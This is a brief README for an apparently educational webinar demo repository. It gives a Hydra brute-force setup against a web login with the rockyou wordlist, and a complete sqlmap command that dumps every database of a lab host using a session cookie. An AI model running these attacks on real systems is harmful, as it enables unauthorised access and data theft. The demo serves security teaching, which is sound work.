# Inside the mind of a Hacker: DEMOS
This repository contains the Demos for the webinar "Inside the mind of a hacker"

## DEMO 1: Brute Force Attack

 - Software: Hydra + rockyou.txt
 - Options:
    - TARGET Single target <<Web Server IP>>
    - Port: 80
    - Protocol: http-post-form
    - Username: admin
    - Password List: /usr/share/wordlists/rockyou.txt
    - http url: /login:username=^USER^&password=^PASS^:again

## DEMO 2: SQL injection

 - Software: SQLMap
 - Command Line:

```sqlmap -u "http://victima.local/invoices?Description=Invoice+1" --dump-all --batch --headers="cookie:session=XXX"```
where **XXX** is the session cookie value retreived from the browser.